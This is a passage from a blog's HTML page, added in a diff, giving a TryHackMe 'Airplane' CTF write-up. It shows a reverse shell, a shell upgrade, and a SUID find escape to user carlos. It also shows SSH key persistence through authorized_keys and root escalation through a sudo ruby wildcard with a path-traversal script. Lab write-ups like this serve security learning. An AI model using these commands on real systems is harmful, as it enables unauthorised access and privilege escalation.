+<li>Execute the reverse shell executable</li>
+</ol>
+<blockquote>
+<p>Make sure your listener is set to the port number you decided in step 1</p>
+</blockquote>
+<pre tabindex="0"><code>run
+y
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/revshell_executed.png" alt="Reverse shell executed"></p>
+<p>On the listener we receive a connection as <code>hudson</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/foothold.png" alt="Foothold"></p>
+<p>We upgrade our shell with the following commands</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/shell_upgrade.png" alt="Shell Upgrade"></p>
+<p>The user flag is not on this account, so we have to move to the second account.</p>
+<h3 id="lateral-movement-shell-as-carlos">Lateral Movement (shell as carlos)</h3>
+<p>We run linpeas and find that <code>/usr/bin/find</code> has the SUID bit set and it is owned by <code>carlos</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/find_binary.png" alt="find binary with SUID bit set"></p>
+<p>On <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" >GTFObins</a>
+
+ we find a payload to escalate our privileges and the user flag is in <code>/home/carlos</code>.</p>
+<pre tabindex="0"><code>/usr/bin/find . -exec /bin/bash -p \; -quit
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/user_flag.png" alt="user flag"></p>
+<p>With <code>ls -la</code> we notice the <code>.ssh</code> directory. We can add an ssh key to <code>/home/carlos/.ssh/authorized_keys</code> to be able to login via SSH as <code>carlos</code>.</p>
+<p>We generate a key pair with</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa -b 2048 -f carlos
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/keygen_carlos.png" alt="SSH keygen"></p>
+<p>We store the content of <code>carlos.pub</code> in <code>/home/carlos/.ssh/authorized_keys</code> using</p>
+<pre tabindex="0"><code>echo &#39;CONTENT OF carlos.pub&#39; &gt; /home/carlos/.ssh/authorized_keys
+
+chmod 600 /home/carlos/.ssh/authorized_keys
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/SSH_setup.png" alt="SSH setup"></p>
+<p>On our local machine we login as carlos with</p>
+<pre tabindex="0"><code>ssh -i carlos carlos@airplane.thm
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/shh_login_carlos.png" alt="SSH login as carlos"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>With <code>sudo -l</code> we learn that <code>carlos</code> is allowed to run any Ruby script located in <code>/root</code> as the root user without providing a password.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/sudo-l.png" alt="sudo -l command"></p>
+<p>This is easily abused by creating our own ruby file containing a command to spawn a shell, moreover because the wildcard <code>*</code> we can execute our file even if it is outside of <code>/root</code>.</p>
+<pre tabindex="0"><code>echo &#39;exec &#34;/bin/sh&#34;&#39; &gt; root.rb
+
+sudo /usr/bin/ruby /root/../home/carlos/root.rb
+</code></pre><p>After executing the two commands above, we gain access to the root account and can read the <code>root.txt</code> file.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/root_flag.png" alt="root flag"></p>
+<p>Thank you for taking the time to read this write up, I hope you found it useful.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/tags/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1287 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-12-11 17:41
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Airplane&amp;caption=THM%3a%20Airplane&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Airplane&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f;description=THM%3a%20Airplane" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f&amp;title=THM%3a%20Airplane&amp;summary=THM%3a%20Airplane&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f&amp;resubmit=true&amp;title=THM%3a%20Airplane" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f;title=THM%3a%20Airplane" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Airplane%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f&amp;t=THM%3a%20Airplane" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Airplane&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f12%2fthm-airplane%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/posts/2024/12/thm-the-sticker-shop/">
+                    <span class="button__text">THM: The Sticker Shop</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
